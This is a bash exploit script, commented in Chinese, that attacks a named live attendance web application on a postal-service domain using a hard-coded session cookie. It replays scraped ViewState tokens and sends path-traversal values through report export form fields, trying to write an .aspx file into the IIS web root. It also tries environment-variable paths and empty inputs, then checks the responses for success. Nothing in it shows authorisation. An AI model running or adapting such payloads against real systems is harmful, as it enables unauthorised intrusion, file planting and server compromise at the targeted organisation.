#!/bin/bash

COOKIE="ASP.NET_SessionId=bezu1wgtbs241i4cyhxapaou"
BASE="http://vps.vnpost.vn/chamcong"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🎯 最后尝试：写入到已存在的目录"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo ""
echo "已知信息:"
echo "  - Web根目录: C:\\inetpub\\wwwroot\\chamcong\\"
echo "  - 目标目录不存在: C:\\TEMP\\"
echo ""
echo "策略: 尝试写入到Web根目录或其子目录"
echo ""

# 获取ViewState
page=$(curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" -H "Cookie: $COOKIE" 2>&1)
VS=$(echo "$page" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3)
VG=$(echo "$page" | grep -oE '__VIEWSTATEGENERATOR" value="[^"]+' | cut -d'"' -f3)
EV=$(echo "$page" | grep -oE '__EVENTVALIDATION" value="[^"]+' | cut -d'"' -f3)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo "[尝试1] 写入到chamcong目录本身"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
    -X POST \
    -H "Cookie: $COOKIE" \
    --data-urlencode "__VIEWSTATE=$VS" \
    --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
    --data-urlencode "__EVENTVALIDATION=$EV" \
    --data-urlencode "txtThang=../../../inetpub/wwwroot/chamcong/x" \
    --data-urlencode "txtNam=.aspx" \
    --data-urlencode "btnExport=Export" \
    -o test1.html 2>&1

result1=$(grep -o "Could not find.*path '[^']*'" test1.html | head -1)
echo "  $result1"

# 检查是否是"找不到目录"还是"其他错误"
if echo "$result1" | grep -q "DirectoryNotFoundException"; then
    echo "  ❌ 目录不存在"
elif [ -z "$result1" ]; then
    echo "  🔥🔥🔥 没有错误！可能成功！"
    echo "  响应大小: $(wc -c < test1.html) bytes"
fi

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[尝试2] 写入到report子目录"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
    -X POST \
    -H "Cookie: $COOKIE" \
    --data-urlencode "__VIEWSTATE=$VS" \
    --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
    --data-urlencode "__EVENTVALIDATION=$EV" \
    --data-urlencode "txtThang=../../../inetpub/wwwroot/chamcong/report/x" \
    --data-urlencode "txtNam=.aspx" \
    --data-urlencode "btnExport=Export" \
    -o test2.html 2>&1

result2=$(grep -o "Could not find.*path '[^']*'" test2.html | head -1)
echo "  $result2"

if [ -z "$result2" ]; then
    echo "  🔥🔥🔥 没有错误！可能成功！"
fi

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[尝试3] 使用空字符串绕过路径"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
    -X POST \
    -H "Cookie: $COOKIE" \
    --data-urlencode "__VIEWSTATE=$VS" \
    --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
    --data-urlencode "__EVENTVALIDATION=$EV" \
    --data-urlencode "txtThang=" \
    --data-urlencode "txtNam=" \
    --data-urlencode "btnExport=Export" \
    -o test3.html 2>&1

size3=$(wc -c < test3.html)
echo "  响应大小: $size3 bytes"

if [ $size3 -gt 10000 ]; then
    echo "  🔥🔥🔥 响应很大！可能有特殊行为！"
    grep -i "error\|exception\|path" test3.html | head -10
fi

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[尝试4] 使用Windows环境变量"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

ENV_VARS=("%TEMP%" "%TMP%" "%USERPROFILE%" "%APPDATA%")

for var in "${ENV_VARS[@]}"; do
    echo "  测试: $var"
    
    curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "txtThang=${var}/test" \
        --data-urlencode "txtNam=2025" \
        --data-urlencode "btnExport=Export" \
        -o "test_env_${var//\%/}.html" 2>&1
    
    result=$(grep -o "Could not find.*path '[^']*'" "test_env_${var//\%/}.html" | head -1)
    echo "    $result"
done

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[尝试5] 测试Print功能（可能不同的文件处理）"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
    -X POST \
    -H "Cookie: $COOKIE" \
    --data-urlencode "__VIEWSTATE=$VS" \
    --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
    --data-urlencode "__EVENTVALIDATION=$EV" \
    --data-urlencode "txtThang=../../../inetpub/wwwroot/chamcong/x" \
    --data-urlencode "txtNam=.aspx" \
    --data-urlencode "btnIn=In" \
    -o test_print.html 2>&1

result_print=$(grep -o "Could not find.*path '[^']*'" test_print.html | head -1)
echo "  $result_print"

if [ -z "$result_print" ]; then
    echo "  🔥🔥🔥 Print功能没有错误！"
    echo "  响应大小: $(wc -c < test_print.html) bytes"
    
    # 检查是否有PDF/打印内容
    if grep -qi "pdf\|print\|application/pdf" test_print.html; then
        echo "  可能生成了PDF"
    fi
fi

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[尝试6] 极限测试：空路径"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 完全空的txtThang和txtNam
curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
    -X POST \
    -H "Cookie: $COOKIE" \
    --data-urlencode "__VIEWSTATE=$VS" \
    --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
    --data-urlencode "__EVENTVALIDATION=$EV" \
    --data "txtThang=" \
    --data "txtNam=" \
    --data-urlencode "btnExport=Export" \
    -o test_empty.html 2>&1

size_empty=$(wc -c < test_empty.html)
echo "  响应大小: $size_empty bytes"

result_empty=$(grep -o "Could not find.*path '[^']*'" test_empty.html | head -1)
if [ -n "$result_empty" ]; then
    echo "  $result_empty"
else
    echo "  🔥🔥🔥 没有路径错误！"
fi

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ 所有最后尝试完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo ""
echo "总结:"
echo "  - 测试了写入到已存在目录"
echo "  - 测试了环境变量"
echo "  - 测试了Print功能"
echo "  - 测试了空路径"
echo ""

# 检查是否有任何成功的迹象
echo "检查是否有成功写入的迹象..."

for file in test*.html; do
    if [ -f "$file" ]; then
        size=$(wc -c < "$file")
        if [ $size -lt 1000 ] || [ $size -gt 10000 ]; then
            echo "  异常响应: $file ($size bytes)"
        fi
    fi
done
